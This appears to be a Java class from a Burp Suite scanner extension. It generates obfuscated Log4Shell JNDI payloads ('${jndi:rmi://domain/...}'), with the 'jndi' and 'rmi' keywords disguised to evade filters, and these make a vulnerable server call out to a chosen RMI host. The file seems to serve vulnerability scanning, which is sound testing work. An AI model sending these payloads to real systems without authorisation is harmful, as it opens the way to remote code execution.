package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

import static burp.utils.Utils.confusionChars;

public class POC11 implements IPOC {
    private String confusion() {
        StringBuilder result = new StringBuilder();
        result.append(confusionChars(new String[]{"j", "n", "d", "i"}));
        result.append(":");
        result.append(confusionChars(new String[]{"r", "m", "i"}));
        return result.toString();
    }

    @Override
    public String generate(String domain) {
        return "${" + confusion() + "://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_RMI;
    }
}